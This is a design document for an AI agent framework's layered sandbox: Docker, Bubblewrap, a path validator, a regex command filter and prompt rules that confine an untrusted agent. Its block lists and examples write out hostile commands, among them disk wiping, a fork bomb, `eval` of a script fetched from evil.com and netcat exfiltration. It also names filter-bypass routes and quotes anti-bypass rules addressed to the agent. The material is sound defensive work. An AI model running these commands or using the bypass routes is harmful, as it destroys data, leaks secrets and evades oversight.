# Layers of Security for Filesystem Protection

**Last Updated:** 2026-01-11
**Project:** Ag3ntum Agent Framework

---

## Overview

Ag3ntum implements a **defense-in-depth** security model with **five distinct layers** of filesystem and command execution protection. Each layer operates independently, creating multiple barriers that an attacker must bypass to compromise the system. For illustration purposes, this document explains how these layers work together to protect user `greg`'s files and system.

**Security Philosophy:** Assume the AI agent is untrusted and may attempt to escape confinement. Every layer provides redundant protection so that if one layer fails, others still maintain security.

### Security Architecture

The five layers of security are:

| Layer | Component | Purpose |
|-------|-----------|---------|
| **1** | Docker | Host isolation - outermost boundary |
| **2** | Bubblewrap | Subprocess sandbox with mount namespace isolation |
| **3** | Ag3ntum MCP Tools | Custom tools with `Ag3ntumPathValidator` for file operations |
| **4** | Command Security Filter | Pre-execution regex-based dangerous command blocking |
| **5** | Prompt Rules | Guidance for the agent (soft enforcement) |

### Tool Configuration

Native Claude Code tools (`Bash`, `Read`, `Write`, `Edit`, etc.) are **BLOCKED** via `tools.disabled`. The agent uses Ag3ntum MCP tools (`mcp__ag3ntum__Bash`, `mcp__ag3ntum__Read`, etc.) which have built-in security validation:
- **Ag3ntumBash** uses Command Security Filter (Layer 4) + Bubblewrap sandbox (Layer 2) for subprocess execution
- **File tools** (Read, Write, Edit, etc.) use `Ag3ntumPathValidator` for path validation (Layer 3)

---

## Layer Execution Flow

When user `greg` makes a request that involves filesystem operations, the security layers are enforced in this order:

```
┌─────────────────────────────────────────────────────────────────┐
│  User Request: "Read the file ./data/secrets.txt"              │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 5: Prompt-Based Guidance                                │
│  ✓ Agent instructed: "Use Ag3ntum MCP tools"                   │
│  ✓ Agent instructed: "Only access workspace directory"         │
│  Status: ✓ PASS (follows tool and path guidance)               │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 4: Command Security Filter (Ag3ntumBash only)           │
│  Note: Only applies to command execution, not file reads       │
│  For Bash commands, CommandSecurityFilter validates:           │
│    - Check 100+ regex patterns for dangerous commands          │
│    - Block: kill, pkill, killall, rm -rf, chmod, etc.          │
│  Status: ✓ N/A (not a Bash command)                            │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 3: Ag3ntum MCP Tool with PathValidator                  │
│  Tool: mcp__ag3ntum__Read (replaces native Read)               │
│  Ag3ntumPathValidator validates:                               │
│    1. Normalize path: ./data/secrets.txt → real Docker path    │
│    2. Check workspace boundary: Is within /workspace? ✓        │
│    3. Check blocklist: Does not match *.env, *.key, etc. ✓     │
│    4. Check read-only: Is in .claude/skills/? NO → writable    │
│  Status: ✓ PASS (path validated)                               │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 2: Bubblewrap Filesystem Sandbox (Ag3ntumBash only)     │
│  Note: mcp__ag3ntum__Read runs in Python process (no bwrap)    │
│  For Bash commands, bwrap provides mount namespace isolation:  │
│    bwrap --bind /workspace /workspace \                        │
│         --ro-bind /skills/.claude/skills ... \                 │
│         --unshare-pid --unshare-ipc \                          │
│         -- bash -c "command"                                   │
│  Status: ✓ File read via Python Path.read_text()              │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 1: Docker Container Isolation                           │
│  Container user: ag3ntum_api (UID 45045)                       │
│  Filesystem view limited to container volumes:                 │
│    - /users/greg/sessions/20260110_103413/workspace (mounted)  │
│    - System directories (read-only)                            │
│  Status: ✓ File read from container filesystem                │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
                    ┌─────────┐
                    │ SUCCESS │
                    └─────────┘
```

**Layer Architecture:**
- **Layer 1 (Docker)** - Provides host isolation, the outermost boundary
- **Layer 2 (Bubblewrap)** - Applies to `Ag3ntumBash` subprocess execution
- **Layer 3 (Ag3ntum Tools)** - All file tools use `Ag3ntumPathValidator`; security is built into each tool
- **Layer 4 (Command Filter)** - Pre-execution regex filtering for dangerous commands in `Ag3ntumBash`
- **Layer 5 (Prompts)** - Guides the agent to use correct tools and paths (soft enforcement)

Native Claude Code tools are **BLOCKED** via `tools.disabled` in `permissions.yaml`.

---

## Layer 1: Docker Container Isolation

### What It Provides

Docker creates the **outermost security boundary**, isolating the entire Ag3ntum application from the host system.

### How It Works for User `greg`

1. **Container User Identity**
   - The agent runs as user `ag3ntum_api` (UID 45045) inside the container
   - This user has NO access to host system files
   - Even if the agent escapes all other layers, it's still confined to the container

2. **Filesystem Mounting**
   ```yaml
   # docker-compose.yml
   volumes:
     - ./users:/users          # Host: Project/users → Container: /users
     - ./config:/config        # Configuration (read-only to agent)
     - ./skills:/skills:ro     # Global skills library (read-only)
     - ./data:/data            # Database
     - ./prompts:/prompts:ro   # Prompt templates (read-only)
     - ./tools:/tools:ro       # Ag3ntum MCP tools (read-only)
   ```

3. **User `greg`'s Session Structure**
   ```
   Host: /Users/greg/EXTRACTUM/Ag3ntum/Project/users/greg/sessions/
   │
   ├── 20260110_103413_6903525c/          # greg's session
   │   ├── workspace/                     # AGENT WORKSPACE (writable)
   │   │   ├── .claude/
   │   │   │   └── skills/                # SDK-compatible skills directory
   │   │   │       ├── devops -> /skills/.claude/skills/devops  # Symlink to global
   │   │   │       └── my_skill -> /users/greg/.claude/skills/my_skill  # User skill
   │   │   ├── output.yaml
   │   │   └── ...                        # Agent-created files
   │   ├── agent.jsonl                    # Execution log (not accessible to agent)
   │   └── session_info.json              # Metadata (not accessible to agent)
   ```
   
   **Skills Propagation:** Skills are made available via symlinks in `workspace/.claude/skills/`:
   - Global skills: Symlinked from `/skills/.claude/skills/<skill_name>`
   - User skills: Symlinked from `/users/{username}/.claude/skills/<skill_name>`
   - User skills override global skills with the same name

4. **Container Capabilities**
   ```yaml
   # docker-compose.yml (ag3ntum-api service)
   cap_add:
     - SYS_ADMIN              # Required for bubblewrap to create namespaces
   security_opt:
     - apparmor:unconfined    # Allow namespace operations
     - seccomp:unconfined     # Allow advanced syscalls for bwrap
   ```

### What It Blocks

- ❌ Direct access to host filesystem (e.g., `/etc/passwd` on host)
- ❌ Access to other users' Docker containers
- ❌ Network access to host services (unless explicitly allowed)
- ❌ Device access (USB, GPU, etc.)

### Bypass Scenarios

- ⚠️ Container escape vulnerabilities (rare, requires kernel exploit)
- ⚠️ Misconfigured volume mounts exposing sensitive host directories

---

## Layer 2: Bubblewrap Filesystem Sandboxing

### What It Provides

**Bubblewrap** (`bwrap`) is a Linux namespace-based sandboxing tool that creates an **isolated filesystem view** for subprocess execution. Even within the Docker container, subprocesses (via `Ag3ntumBash`) cannot see the full container filesystem—only what's explicitly mounted.

> **Important:** Bubblewrap ONLY applies to `mcp__ag3ntum__Bash` (subprocess execution). Other Ag3ntum file tools (`mcp__ag3ntum__Read`, `mcp__ag3ntum__Write`, etc.) run in the Python process and use `Ag3ntumPathValidator` for security.

> **Filtered `/proc`:** Ag3ntum implements **filtered `/proc`** to prevent process enumeration attacks. Agents cannot see other processes' PIDs, command lines, or environments. Only safe system information (`/proc/cpuinfo`, `/proc/meminfo`, etc.) and own process info (`/proc/self`) are exposed.

### How It Works for User `greg`

1. **Sandbox Configuration** (`permissions.yaml`)
   ```yaml
   sandbox:
     enabled: true
     file_sandboxing: true
     network_sandboxing: true
     use_tmpfs_root: true     # Start with empty root filesystem

     # /proc filtering - prevents process enumeration attacks
     proc_filtering:
       enabled: true  # Recommended: true (hides processes from agents)
       allowed_entries:
         - "/proc/self"      # Own process info (required)
         - "/proc/cpuinfo"   # CPU information (safe)
         - "/proc/meminfo"   # Memory statistics (safe)
         - "/proc/uptime"    # System uptime (safe)
         - "/proc/version"   # Kernel version (safe)
         # Note: PIDs like /proc/[0-9]+/ are NOT exposed

     static_mounts:           # System binaries (always mounted)
       system_usr:
         source: "/usr"
         target: "/usr"
         mode: ro
       system_lib:
         source: "/lib"
         target: "/lib"
         mode: ro
       system_bin:
         source: "/bin"
         target: "/bin"
         mode: ro
     
     session_mounts:          # User-specific mounts
       workspace:
         source: "/users/{username}/sessions/{session_id}/workspace"
         target: "/workspace"
         mode: rw             # READ-WRITE
       # Global skills - mounted so symlinks in workspace can resolve
       global_skills:
         source: "{skills_dir}/.claude/skills"
         target: "{skills_dir}/.claude/skills"
         mode: ro             # READ-ONLY
       # User skills - mounted so symlinks in workspace can resolve
       user_skills:
         source: "/users/{username}/.claude/skills"
         target: "/users/{username}/.claude/skills"
         mode: ro             # READ-ONLY
     
     environment:
       home: "/workspace"     # HOME set to workspace
       path: "/usr/bin:/bin"
       clear_env: true        # No environment leakage
   ```
   
   **Skills Mount Strategy:** Skills are accessed via symlinks in `workspace/.claude/skills/`. Bubblewrap mounts the actual skill source directories (global and user-specific) so that symlinks can resolve correctly inside the sandbox.

2. **When greg Runs a Bash Command via Ag3ntumBash**

   Original command: `python ./script.py`

   Wrapped command (automatically by Ag3ntumBash tool internally):
   ```bash
   bwrap \
     --unshare-pid \                    # New PID namespace (process isolation)
     --unshare-uts \                    # New hostname namespace
     --unshare-ipc \                    # New IPC namespace
     --die-with-parent \                # Kill sandbox if parent dies
     --new-session \                    # New TTY session
     --clearenv \                       # Clear all environment variables
     --setenv HOME /workspace \         # Set HOME
     --setenv PATH /usr/bin:/bin \      # Set PATH
     --chdir /workspace \               # Start in workspace
     --tmpfs /tmp:size=100M \           # Ephemeral /tmp (100MB)
     --tmpfs /proc \                    # SECURITY: Empty /proc (filtered)
     --ro-bind /proc/self /proc/self \  # Own process info only
     --ro-bind /proc/cpuinfo /proc/cpuinfo \    # Safe: CPU info
     --ro-bind /proc/meminfo /proc/meminfo \    # Safe: Memory info
     --ro-bind /proc/uptime /proc/uptime \      # Safe: Uptime
     --ro-bind /proc/version /proc/version \    # Safe: Kernel version
     --dev /dev \                       # Mount /dev
     --ro-bind /usr /usr \              # System binaries (read-only)
     --ro-bind /lib /lib \              # System libraries (read-only)
     --ro-bind /bin /bin \              # Core utilities (read-only)
     --bind /users/greg/sessions/20260110_103413/workspace /workspace \
     --ro-bind /skills/.claude/skills /skills/.claude/skills \  # Global skills (ro)
     --ro-bind /users/greg/.claude/skills /users/greg/.claude/skills \  # User skills (ro)
     -- bash -c "python ./script.py"
   ```
   
   **Skills via Symlinks:** The workspace contains symlinks in `.claude/skills/` that point to actual skill directories. Bubblewrap mounts the skill source directories so symlinks resolve correctly.

   **Key Security Feature:** `/proc` is created as empty `tmpfs`, then only safe entries are selectively bind-mounted. This prevents agents from:
   - Enumerating other process PIDs (`/proc/[0-9]+/`)
   - Reading process command lines (`/proc/[pid]/cmdline`)
   - Reading process environments (`/proc/[pid]/environ` - may contain secrets)
   - Accessing network configuration (`/proc/net/*`)
   - Reading system tunables (`/proc/sys/*`)

3. **What greg's Agent Sees (Sandbox Filesystem View)**
   ```
   Sandbox Filesystem View (subprocesses only):

   /                     (tmpfs - empty root)
   ├── workspace/        (rw) ← greg's session workspace (writable)
   │   ├── .claude/
   │   │   └── skills/   (symlinks to actual skill directories)
   │   │       ├── devops -> /skills/.claude/skills/devops
   │   │       └── my_skill -> /users/greg/.claude/skills/my_skill
   │   ├── output.yaml
   │   ├── script.py
   │   └── ...
   ├── skills/           (ro) ← Global skills (mounted for symlink resolution)
   │   └── .claude/skills/
   │       └── devops/
   ├── users/greg/.claude/skills/  (ro) ← User skills (mounted for symlink resolution)
   │   └── my_skill/
   ├── usr/              (ro) ← System binaries
   ├── lib/              (ro) ← System libraries
   ├── bin/              (ro) ← Core utilities
   ├── tmp/              (tmpfs) ← Ephemeral scratch space
   ├── proc/             (tmpfs) ← FILTERED /proc (prevents process enumeration)
   │   ├── self/         (own process info)
   │   ├── cpuinfo       (CPU information)
   │   ├── meminfo       (memory statistics)
   │   ├── uptime        (system uptime)
   │   └── version       (kernel version)
   │   [NO /proc/[0-9]+/ directories - other PIDs hidden]
   └── dev/              (devfs)

   NOT VISIBLE:
   - /config            (Agent cannot see configuration files)
   - /data              (Agent cannot see database)
   - /users/greg/sessions/.../agent.jsonl (Execution logs)
   - Other users' sessions (other /users/* directories)
   - /proc/[0-9]+/      (Other process PIDs - security filtered)
   - /proc/net/*        (Network configuration - not mounted)
   - /proc/sys/*        (Kernel tunables - not mounted)
   ```

   **Key Features:**
   - Skills are accessed via symlinks in `workspace/.claude/skills/`
   - Actual skill directories are mounted read-only so symlinks resolve
   - `/proc` is filtered to only expose safe system information and own process info
   - Other process PIDs are completely hidden (cannot enumerate /proc/1, /proc/2, etc.)

4. **Namespace Isolation**
   - **PID namespace**: Subprocesses cannot see other processes
   - **Mount namespace**: Custom filesystem view with only mounted paths visible
   - **IPC namespace**: No shared memory access with host
   - **UTS namespace**: Isolated hostname
   - ⚠️ **Network namespace**: NOT isolated in Docker (nested container limitation)

5. **Process Information Filtering**

   Ag3ntum implements filtered `/proc` with `--tmpfs /proc` + selective bind mounts to prevent process enumeration attacks:
   
   ```bash
   # Example: Agent attempts to list processes
   agent> ls /proc | grep -E "^[0-9]+$"
   (no output - 0 PIDs visible)

   agent> cat /proc/1/cmdline
   cat: /proc/1/cmdline: No such file or directory  # ✓ Blocked

   agent> ls /proc
   self cpuinfo meminfo uptime version  # Only safe entries
   ```

   **What agents CAN do:**
   - ✅ Read own process info via `/proc/self/`
   - ✅ Get system info (CPU, memory, uptime)
   - ✅ Run Python/Node.js scripts normally

   **What agents CANNOT do:**
   - ❌ List other process PIDs
   - ❌ Read other processes' command lines
   - ❌ Read other processes' environments (prevents secret leakage)
   - ❌ Use `ps`, `top`, `htop` (expected limitation)
   - ❌ Use `pgrep`, `pidof` to find processes by name

### What It Blocks

**Filesystem Access:**
- ❌ Reading `/etc/passwd` (not mounted)
- ❌ Writing to skills directories (read-only mounts)
- ❌ Writing to `/usr`, `/lib`, `/bin` (read-only mounts)
- ❌ Accessing session logs (not mounted)
- ❌ Accessing other sessions (not mounted)
- ❌ Accessing other user directories (only own user skills mounted)

**Process Information:**
- ❌ Enumerating other process PIDs (`ls /proc` shows 0 PIDs)
- ❌ Reading other processes' command lines (`/proc/[pid]/cmdline` not accessible)
- ❌ Reading other processes' environments (`/proc/[pid]/environ` not accessible - **prevents secret leakage**)
- ❌ Network introspection (`/proc/net/*` not mounted)
- ❌ Kernel tunables (`/proc/sys/*` not mounted)
- ❌ Process search by name (`pgrep`, `pidof` tools fail)
- ❌ Process listing tools (`ps`, `top`, `htop` fail - expected limitation)

**Process Manipulation:**
- ❌ `kill <pid>` only affects processes spawned within the sandbox
- ❌ `pkill`, `killall` by name (cannot enumerate processes)
- ❌ Signal sending to container processes (PIDs not visible)

### Integration with Ag3ntumBash

**Architecture:** Bubblewrap sandboxing is integrated **exclusively** in the `Ag3ntumBash` MCP tool:

1. **Ag3ntumBash Tool:** The `mcp__ag3ntum__Bash` MCP tool has bubblewrap sandboxing **built-in**. When a `SandboxExecutor` is passed to `create_ag3ntum_bash_mcp_server()`, all commands are wrapped in bwrap before execution.

2. **No Redundant Wrapping:** The permission callback no longer wraps Bash commands in bwrap. Security is enforced by the tool itself.

**Execution Flow for Ag3ntumBash:**
1. Agent calls `mcp__ag3ntum__Bash(command="ls -la")`
2. SDK invokes `can_use_tool` callback for basic permission check
3. Callback returns `PermissionResultAllow`
4. SDK executes Ag3ntumBash MCP tool
5. Ag3ntumBash wraps command in bwrap internally
6. Command executes in isolated sandbox

**Fail-Closed Design:** If bwrap fails to execute (e.g., not installed, permission denied), the command is **DENIED** by Ag3ntumBash with an error message. The tool will NOT fall back to unsandboxed execution.

```python
# From tools/ag3ntum/ag3ntum_bash/tool.py
if sandbox_executor is not None and sandbox_executor.config.enabled:
try:
        bwrap_cmd = sandbox_executor.build_bwrap_command(
            ["bash", "-c", command],
        allow_network=allow_network,
    )
        exec_command = bwrap_cmd
except Exception as e:
    # SECURITY: FAIL-CLOSED - if sandbox fails, DENY the command
        logger.error(f"Ag3ntumBash: SANDBOX FAIL-CLOSED - bwrap error: {e}")
        return _error_response(
            f"Sandbox unavailable (bwrap error: {e}). "
            "Commands are blocked for security."
    )
```

### Bypass Scenarios

- ⚠️ Kernel vulnerabilities in namespace implementation
- ⚠️ Privileged processes escaping via `/proc` or `/sys` (not fully accessible)
- ⚠️ Symlink attacks (mitigated by PathValidator in Layer 3)

---

## Layer 3: Ag3ntum MCP Tools with PathValidator

### What It Provides

All file and command operations go through **Ag3ntum MCP tools** (`mcp__ag3ntum__Read`, `mcp__ag3ntum__Write`, etc.) which have **built-in security validation**. Native Claude Code tools are blocked.

**Two Security Mechanisms:**
1. **Ag3ntumPathValidator** - For Python file tools (Read, Write, Edit, etc.)
2. **Bubblewrap Sandbox** - For subprocess execution (Ag3ntumBash) - see Layer 2

### How It Works for User `greg`

1. **Tool Configuration** (`permissions.yaml`)
   ```yaml
   tools:
     # Ag3ntum MCP tools - have built-in security
     enabled:
       - mcp__ag3ntum__Read      # PathValidator
       - mcp__ag3ntum__Write     # PathValidator
       - mcp__ag3ntum__Edit      # PathValidator
       - mcp__ag3ntum__MultiEdit # PathValidator
       - mcp__ag3ntum__Glob      # PathValidator
       - mcp__ag3ntum__Grep      # PathValidator
       - mcp__ag3ntum__LS        # PathValidator
       - mcp__ag3ntum__Bash      # Bubblewrap sandbox
       - mcp__ag3ntum__WebFetch  # Domain blocklist
       - Task
       - Skill
       - TodoRead
       - TodoWrite
       
     # BLOCKED: Native Claude Code tools
     disabled:
       - Bash      # Use mcp__ag3ntum__Bash instead
       - Read      # Use mcp__ag3ntum__Read instead
       - Write     # Use mcp__ag3ntum__Write instead
       - Edit      # Use mcp__ag3ntum__Edit instead
       - MultiEdit # Use mcp__ag3ntum__MultiEdit instead
       - Glob      # Use mcp__ag3ntum__Glob instead
       - Grep      # Use mcp__ag3ntum__Grep instead
       - LS        # Use mcp__ag3ntum__LS instead
       - WebFetch  # Use mcp__ag3ntum__WebFetch instead
   ```

2. **Ag3ntumPathValidator (for Python file tools)**
   
   The `Ag3ntumPathValidator` class (`src/core/path_validator.py`) validates all paths before file operations:
   
   ```python
   # Ag3ntumPathValidator validates:
   # 1. Path normalization: ./foo, /workspace/foo → real Docker path
   # 2. Workspace boundary: Is path within session workspace?
   # 3. Blocklist: Does path match *.env, *.key, .git/**, etc.?
   # 4. Read-only check: Is path in .claude/skills/?
   # 5. Logging: All access attempts are logged
   
   class Ag3ntumPathValidator:
       def validate_path(
           self,
           path: str,
           operation: Literal["read", "write", "edit", "delete", "list", "glob", "grep"],
       ) -> ValidatedPath:
           # Normalize: ./foo → /users/greg/sessions/xxx/workspace/foo
           normalized = self._normalize_path(path)
           
           # Check workspace boundary
           if not normalized.is_relative_to(self.workspace):
               raise PathValidationError("Path outside workspace")
           
           # Check blocklist (*.env, *.key, .git/**, etc.)
           for pattern in self.config.blocklist:
               if fnmatch.fnmatch(rel_path, pattern):
                   raise PathValidationError(f"Matches blocklist: {pattern}")
           
           # Check read-only (skills directory)
           if is_readonly and operation in ("write", "edit", "delete"):
               raise PathValidationError("Read-only path")
           
           return ValidatedPath(normalized=normalized)
   ```

3. **Session-Scoped Validation**
   
   Each session gets its own `PathValidator` instance configured with the real workspace path:
   
```python
   # From agent_core.py _build_options()
   configure_path_validator(
       session_id=session_info.session_id,
       workspace_path=workspace_dir,  # Real Docker path
       skills_path=skills_dir,
   )
   ```

4. **Example: greg Reads a File**
   
   ```python
   # Agent calls: mcp__ag3ntum__Read(file_path="./data/file.txt")
   
   # Ag3ntumRead tool:
   async def read(args):
       file_path = args.get("file_path")  # "./data/file.txt"
       
       # Get PathValidator for this session
       validator = get_path_validator(session_id)
       
       # Validate path
       validated = validator.validate_path(file_path, operation="read")
       # → normalized: /users/greg/sessions/xxx/workspace/data/file.txt
       
       # Read file using validated path
       return validated.normalized.read_text()
   ```

### What It Blocks

- ❌ **Absolute paths outside workspace**: `/etc/passwd` → "Path outside workspace"
- ❌ **Parent traversal**: `../../../secrets.yaml` → "Path outside workspace"
- ❌ **Sensitive files**: `.env`, `*.key`, `.git/**` → "Matches blocklist"
- ❌ **Skills modification**: `./.claude/skills/devops/script.py` (write) → "Read-only path"
- ❌ **Native Claude Code tools**: `Read`, `Write`, `Bash` → Blocked via `tools.disabled`

### What It Allows for greg

- ✅ `mcp__ag3ntum__Read(./data/file.txt)` - workspace-relative path
- ✅ `mcp__ag3ntum__Write(./output.yaml)` - workspace write
- ✅ `mcp__ag3ntum__Read(./.claude/skills/devops/SKILL.md)` - skills read (read-only)
- ✅ `mcp__ag3ntum__Read(/workspace/file.txt)` - `/workspace` path (translated)
- ✅ `mcp__ag3ntum__Bash(ls -la)` - sandboxed command execution

### Configuration (`config/tools_security.yaml`)

```yaml
path_validator:
  workspace_mount: "/workspace"
  skills_prefix: ".claude/skills"  # Relative to workspace
  log_all_access: true
  
  # Patterns blocked even within workspace
  blocklist:
    - "*.env"
    - "*.key"
    - ".git/**"
    - "__pycache__/**"
    - "*.pyc"
    - ".secrets/**"
  
  # Read-only path prefixes (relative to workspace)
  readonly_prefixes:
    - ".claude/skills/"

network:
  blocked_domains:
    - "localhost"
    - "127.0.0.1"
    - "169.254.169.254"  # AWS metadata
```

### Bypass Scenarios

- ⚠️ Bugs in PathValidator implementation
- ⚠️ Race conditions in path validation (mitigated by atomic operations)
- ⚠️ Symlink attacks (PathValidator resolves paths before validation)

---

## Layer 4: Command Security Filter

### What It Provides

**Command Security Filter** is a regex-based pre-execution security layer that blocks dangerous commands before they reach the Bubblewrap sandbox. It provides defense-in-depth by catching malicious commands that could harm the system, terminate processes, or compromise security.

> **Important:** Command Security Filter ONLY applies to `mcp__ag3ntum__Bash` tool. It validates commands **before execution**, blocking them at the application level before they reach the OS sandbox.

### How It Works for User `greg`

1. **Security Rules Configuration** (`config/security/command_filtering.yaml`)
   
   ```yaml
   categories:
     - category: Process Termination
       rules:
         - pattern: '^\s*(/usr/bin/|/bin/)?kill\s+(-[0-9]+|-SIG[A-Z]+)?\s+\d+'
           action: block
           exploit: "kill -9 147"
         - pattern: '^\s*(/usr/bin/|/bin/)?pkill\s+'
           action: block
           exploit: "pkill python"
         - pattern: '^\s*(/usr/bin/|/bin/)?killall\s+'
           action: block
           exploit: "killall bash"
     
     - category: Destructive Operations
       rules:
         - pattern: '^\s*(/usr/bin/|/bin/)?rm\s+.*(-rf|--recursive.*--force)'
           action: block
           exploit: "rm -rf /"
         - pattern: '^\s*(/usr/bin/|/bin/)?chmod\s+777\s+'
           action: block
           exploit: "chmod 777 /workspace"
     
     # ... 14 more categories with 100+ total patterns
   ```

2. **CommandSecurityFilter Class** (`src/core/command_security.py`)
   
   ```python
   class CommandSecurityFilter:
       """
       Validates commands against security rules before execution.
       
       Features:
       - 100+ regex patterns across 16 security categories
       - Block or record actions for each rule
       - Fail-closed by default (block all if rules fail to load)
       - Detailed logging of matched rules
       """
       
       def check_command(self, command: str) -> SecurityCheckResult:
           """
           Check if a command is allowed to execute.
           
           Returns:
               SecurityCheckResult with:
               - is_allowed: bool (False if blocked)
               - matched_rules: list (patterns that matched)
               - reason: str (why blocked)
           """
           for category in self.config.categories:
               for rule in category.rules:
                   if re.search(rule.pattern, command):
                       if rule.action == "block":
                           return SecurityCheckResult(
                               is_allowed=False,
                               matched_rules=[{
                                   "pattern": rule.pattern,
                                   "category": category.category,
                                   "action": "block"
                               }],
                               reason=f"Blocked by security rule: {category.category}"
                           )
           
           return SecurityCheckResult(is_allowed=True, matched_rules=[])
   ```

3. **Integration with Ag3ntumBash** (`tools/ag3ntum/ag3ntum_bash/tool.py`)
   
   When greg runs a Bash command, it flows through the Command Security Filter:
   
   ```python
   # Ag3ntumBash tool execution flow
   async def execute(args):
       command = args.get("command")  # "python script.py"
       
       # Layer 4: Command Security Filter (NEW)
       security_filter = get_command_security_filter()
       if security_filter:
           result = security_filter.check_command(command)
           if not result.is_allowed:
               logger.warning(
                   f"CommandSecurityFilter BLOCKED: {command[:100]}"
                   f" | Reason: {result.reason}"
               )
               return _error_response(
                   f"Command blocked by security policy: {result.reason}"
               )
       
       # Layer 2: Bubblewrap Sandbox (if not blocked above)
       if sandbox_executor and sandbox_executor.config.enabled:
           bwrap_cmd = sandbox_executor.build_bwrap_command(...)
           result = subprocess.run(bwrap_cmd, ...)
   ```

4. **Security Categories (16 Total)**
   
   The Command Security Filter protects against:
   
   | Category | Patterns | Examples Blocked |
   |----------|----------|------------------|
   | Process Termination | 3 | `kill -9 147`, `pkill python`, `killall bash` |
   | Destructive Operations | 4 | `rm -rf /`, `mkfs.ext4`, `dd if=/dev/zero` |
   | Permission Manipulation | 3 | `chmod 777`, `chown root`, `chgrp` |
   | System Modification | 5 | `mount`, `umount`, `sysctl`, `modprobe` |
   | User Management | 4 | `useradd`, `userdel`, `passwd`, `sudo` |
   | Network Reconnaissance | 5 | `nmap`, `netcat`, `tcpdump` |
   | Code Injection | 4 | `eval`, backticks, command substitution |
   | Path Traversal | 3 | `../../../etc/passwd` |
   | Environment Manipulation | 2 | `export PATH=`, `unset` |
   | Container Escape | 3 | `docker run`, `kubectl`, `nsenter` |
   | Kernel/System Introspection | 4 | `dmesg`, `/proc/[0-9]+/` access |
   | Privilege Escalation | 5 | `sudo`, `su`, `setuid` |
   | Data Exfiltration | 3 | `curl --data-binary`, `nc -e` |
   | Resource Exhaustion | 4 | `:(){ :\|:& };:`, infinite loops |
   | Cryptographic Bypass | 2 | `openssl`, key generation |
   | Shell Obfuscation | 3 | Base64 decode + eval, hex encoding |

5. **Example: greg Tries to Kill Process**
   
   **Request:** `mcp__ag3ntum__Bash(kill -9 147)`
   
   ```
   Layer 5 (Prompt): Agent instructed not to terminate processes
   ├─ If agent ignores: Continue to Layer 4...
   
   Layer 4 (Command Security Filter):
   ├─ Input command: "kill -9 147"
   ├─ Check regex patterns:
   │   ├─ Pattern: ^\s*(/usr/bin/|/bin/)?kill\s+(-[0-9]+|-SIG[A-Z]+)?\s+\d+
   │   ├─ Match: ✓ YES (Process Termination category)
   │   ├─ Action: block
   │   └─ Result: ❌ SecurityCheckResult(is_allowed=False)
   └─ Result: ❌ BLOCKED BEFORE EXECUTION
   
   Agent receives:
     "Command blocked by security policy: Blocked by security rule: Process Termination"
   
   Bubblewrap: NEVER REACHED (command blocked at Layer 4)
   ```
   
   **Key Feature:** Command is blocked **before** reaching the sandbox, preventing any execution attempt.

### What It Blocks

**Process Manipulation:**
- ❌ `kill -9 147` → Process termination
- ❌ `pkill python` → Process search and kill
- ❌ `killall bash` → Kill by name
- ❌ `kill -SIGTERM $(pidof agent)` → Signal sending

**Destructive Operations:**
- ❌ `rm -rf /` → Recursive deletion
- ❌ `chmod 777 /workspace` → Permission changes
- ❌ `dd if=/dev/zero of=/dev/sda` → Disk wiping
- ❌ `mkfs.ext4 /dev/sda1` → Filesystem formatting

**System Modification:**
- ❌ `mount /dev/sdb1 /mnt` → Filesystem mounting
- ❌ `sysctl kernel.panic=1` → Kernel parameter changes
- ❌ `modprobe malicious_module` → Kernel module loading

**Privilege Escalation:**
- ❌ `sudo su -` → User switching
- ❌ `useradd hacker` → User creation
- ❌ `passwd root` → Password changes

**Container Escape:**
- ❌ `docker run --privileged` → Container execution
- ❌ `kubectl exec` → Kubernetes access
- ❌ `nsenter -t 1` → Namespace entry

**Code Injection:**
- ❌ `eval "$(curl http://evil.com/script)"` → Remote code execution
- ❌ `bash -c "$(cat /tmp/malicious)"` → Code execution
- ❌ Command substitution with backticks

### What It Allows for greg

- ✅ `python ./script.py` → Safe script execution
- ✅ `ls -la /workspace` → Directory listing
- ✅ `cat ./data/file.txt` → File reading
- ✅ `grep "pattern" ./logs/*.log` → Text search
- ✅ `npm install package` → Package installation
- ✅ `git status` → Version control

### Configuration (`config/security/command_filtering.yaml`)

```yaml
categories:
  - category: Process Termination
    rules:
      - pattern: '^\s*(/usr/bin/|/bin/)?kill\s+'
        action: block
        exploit: "kill -9 147"
      # ... more rules

fail_closed: true  # Block all commands if rules fail to load
max_log_matches: 5  # Limit logged matches per command
```

### Integration Points

1. **Ag3ntumBash Tool** - Only tool that uses Command Security Filter
2. **Fail-Closed Design** - If filter fails to load, ALL commands are blocked
3. **Logging** - All blocked commands are logged with matched patterns
4. **Testing** - 101 test cases validate all security rules

### Bypass Scenarios

- ⚠️ **Regex evasion:** Commands crafted to bypass patterns (mitigated by 100+ patterns covering variations)
- ⚠️ **Shell features:** Command chaining (`&&`, `||`, `;`) may bypass single-command checks
- ⚠️ **Encoding:** Base64, hex, or other encoding to obfuscate commands (covered by separate patterns)
- ⚠️ **Incomplete patterns:** New attack vectors not covered by existing rules (requires periodic updates)

**Defense-in-Depth:** Even if Command Security Filter is bypassed, Layer 2 (Bubblewrap) and Layer 1 (Docker) still provide protection.

---

## Layer 5: Prompt-Based Guidance

### What It Provides

The **system prompt** instructs the AI agent about security policies and expected behavior. This is a **soft enforcement layer**—the agent is guided to follow security practices, but the prompt alone cannot enforce security.

> **Important:** Prompt-based security is NOT reliable. Layers 1-4 provide the actual technical enforcement. The prompt is guidance, not a security boundary.

### How It Works for User `greg`

1. **Security Module in System Prompt** (`prompts/modules/security.j2`)
   
   The prompt instructs the agent to:
   - Use Ag3ntum MCP tools for all file operations
   - Only access files within the workspace
   - Never use absolute paths
   - Never attempt to bypass the sandbox
   - Never disclose system information

2. **Tool Usage Instructions** (`prompts/modules/tools.j2`)
   
   ```markdown
   ## Ag3ntum Tools (Required)
   
   **IMPORTANT**: You MUST use Ag3ntum MCP tools for all file and command operations.
   These tools have `mcp__ag3ntum__` prefix and provide built-in security validation.
   
   ### File Operations
   - **`mcp__ag3ntum__Read`** - Read file contents
